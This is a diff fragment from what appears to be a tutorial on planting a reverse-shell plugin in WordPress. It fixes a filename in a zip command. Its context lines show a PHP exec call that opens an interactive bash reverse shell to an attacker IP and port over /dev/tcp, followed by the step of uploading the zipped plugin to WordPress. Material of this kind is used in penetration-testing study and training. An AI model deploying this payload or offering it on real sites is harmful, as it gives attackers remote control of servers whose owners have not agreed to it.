@@ -118,5 +118,5 @@ Php file:
 exec("/bin/bash -c 'bash -i >& /dev/tcp/$AttackerIp/$AttackerPort 0>&1'");
 ?>
 ```
-then zip it: `zip revsh-wp-plugin.zip revsh-wp-plugin.sh` \
+then zip it: `zip revsh-wp-plugin.zip revsh-wp-plugin.php` \
 and upload it on WordPress.
